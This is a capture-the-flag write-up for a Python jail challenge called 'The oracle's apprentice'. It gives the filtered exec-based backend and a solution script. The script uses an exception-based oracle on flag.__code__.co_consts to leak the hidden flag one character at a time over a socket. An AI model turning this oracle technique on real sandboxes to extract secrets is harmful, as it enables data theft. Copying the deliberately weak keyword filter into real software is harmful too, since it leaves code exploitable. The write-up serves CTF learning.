The oracle's apprentice
==========
The pyjail isn't designed to pop a shell, or read a file. Just recover the redacted part of the source code.

Host : misc.heroctf.fr

Port : 6000

The backend script is:
```python
#! /usr/bin/python3

def flag():
    # REDACTED
    # THIS FUNCTION DOES NOT PRINT OR RETURN ANYTHING
    e = 5
    w = 'd'
    pass


def jail():
    user_input = input(">> ")

    filtered = ["import", "os", "sys", "eval", "exec", "__builtins__", "__globals__", "__getattribute__", "__dict__", "__base__", "__class__", "__subclasses__", "dir", "help", "exit", "open", "read"]

    valid_input = True
    for f in filtered:
        if f in user_input:
            print("tssss, what are u doing")
            valid_input = False
            break

    if valid_input:
        try:
            exec(user_input, {"__builtins__": {}}, {'flag':flag})
        except:
            print("You thought I would print errors for u ?")

if __name__ == "__main__":
    try:
        while True:
            jail()
    except KeyboardInterrupt:
        print("Bye")
```

Solution
=========

We meet two problems here:
1. The input is filtered to disallow execution almost all builtin functions. This problem is solved using the oracle based on math operations. For example, if we consider string ```s = "Sample String"```, our oracle is ```1/(s[i]==X)```. If symbol s[i] is X the backend returns nothing otherwise it throw an exception message. Thus, we can recover a string symbol by symbol.

2. It seeps, the flag function doesn't return. However, we know, that the function code contains the flag. We can extract it using "__code__" property to access the flag and the oracle from previous point.

Further, we program a socket to automate the process of flag extraction. The complete code is:
```python
import socket
import time
import string

HOST="misc.heroctf.fr"
PORT = 6000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

for j in range(0,20):
    for k in range(0,5):
        for i in string.printable:
            s.sendall(f"23/(flag.__code__.co_consts[{j}][{k}]=='{i}')\n".encode())
            time.sleep(0.1)
            data = s.recv(1024)
            if(not b'You thought' in data):
                print(str(i), end="")
                break
```

